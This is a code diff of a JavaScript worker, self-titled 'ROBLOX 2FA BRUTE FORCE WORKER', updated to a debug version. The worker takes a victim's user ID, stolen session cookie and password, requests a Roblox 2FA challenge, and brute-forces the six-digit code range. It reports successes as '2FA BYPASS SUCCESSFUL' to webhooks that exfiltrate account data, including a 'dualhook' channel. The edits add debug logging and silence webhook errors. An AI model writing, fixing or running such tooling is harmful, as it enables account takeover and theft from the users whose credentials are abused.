@@ -1,6 +1,5 @@
 // ============================================================
-// ROBLOX 2FA BRUTE FORCE WORKER v2.3
-// FIXED: env variable handling
+// ROBLOX 2FA BRUTE FORCE WORKER v2.4 - DEBUG VERSION
 // ============================================================
 
 addEventListener('fetch', event => {
@@ -73,6 +72,7 @@ async function handleRequest(request) {
   const end = endCode || 999999;
 
   try {
+    // STEP 1: Request challenge with password
     const challengeResult = await requestChallenge(userId, cookie, password);
     
     if (!challengeResult.success) {
@@ -96,6 +96,7 @@ async function handleRequest(request) {
 
     const challengeId = challengeResult.challengeId;
 
+    // STEP 2: Check 2FA config
     const config = await get2FAConfig(userId, cookie);
     if (!config || !config.passwordEnabled) {
       await sendDualWebhook({
@@ -116,6 +117,7 @@ async function handleRequest(request) {
       });
     }
 
+    // STEP 3: Brute force
     const result = await bruteForce2FA(userId, cookie, challengeId, start, end);
     const duration = Date.now() - startTime;
 
@@ -200,7 +202,8 @@ async function handleRequest(request) {
   } catch (e) {
     return new Response(JSON.stringify({
       success: false,
-      error: 'Worker error: ' + e.message
+      error: 'Worker error: ' + e.message,
+      stack: e.stack
     }), {
       status: 200,
       headers: {
@@ -228,6 +231,10 @@ async function requestChallenge(userId, cookie, password) {
 
     const data = await response.json();
 
+    // Log the full response for debugging
+    console.log('Challenge response status:', response.status);
+    console.log('Challenge response data:', JSON.stringify(data));
+
     if (response.status === 200 && data.challengeId) {
       return { success: true, challengeId: data.challengeId };
     }
@@ -238,10 +245,13 @@ async function requestChallenge(userId, cookie, password) {
     if (response.status === 429) {
       return { success: false, error: 'Rate limited - try again later' };
     }
+    if (response.status === 400) {
+      return { success: false, error: 'Bad request: ' + (data.message || JSON.stringify(data)) };
+    }
 
-    return { success: false, error: data.message || 'Unknown error' };
+    return { success: false, error: data.message || data.error || 'Unknown error from Roblox' };
   } catch (e) {
-    return { success: false, error: e.message || 'Network error' };
+    return { success: false, error: 'Network error: ' + e.message };
   }
 }
 
@@ -259,6 +269,8 @@ async function get2FAConfig(userId, cookie) {
 
     const config = await response.json();
 
+    console.log('2FA Config:', JSON.stringify(config));
+
     return {
       passwordEnabled: config.password?.enabled || false,
       authenticatorEnabled: config.authenticator?.enabled || false,
@@ -266,6 +278,7 @@ async function get2FAConfig(userId, cookie) {
       enhancedProtection: config.enhancedProtection || false
     };
   } catch (e) {
+    console.log('Get2FAConfig error:', e.message);
     return null;
   }
 }
@@ -434,12 +447,8 @@ async function getAccountInfo(userId, cookie) {
 }
 
 async function sendLiveBypass(data) {
-  // Get webhook URL from environment
   const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_MAIN : null;
-  if (!webhookURL) {
-    console.log('WEBHOOK_MAIN not set, skipping live bypass');
-    return;
-  }
+  if (!webhookURL) return;
 
   const embed = {
     title: '2FA BYPASS SUCCESSFUL',
@@ -471,18 +480,12 @@ async function sendLiveBypass(data) {
         embeds: [embed]
       })
     });
-  } catch (e) {
-    console.log('Live webhook failed:', e.message);
-  }
+  } catch (e) {}
 }
 
 async function sendDualWebhook(data) {
-  // Get webhook URL from environment
   const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_DUAL : null;
-  if (!webhookURL) {
-    console.log('WEBHOOK_DUAL not set, skipping dualhook');
-    return;
-  }
+  if (!webhookURL) return;
 
   let embed;
 
@@ -534,7 +537,5 @@ async function sendDualWebhook(data) {
         embeds: [embed]
       })
     });
-  } catch (e) {
-    console.log('Dual webhook failed:', e.message);
-  }
+  } catch (e) {}
 }
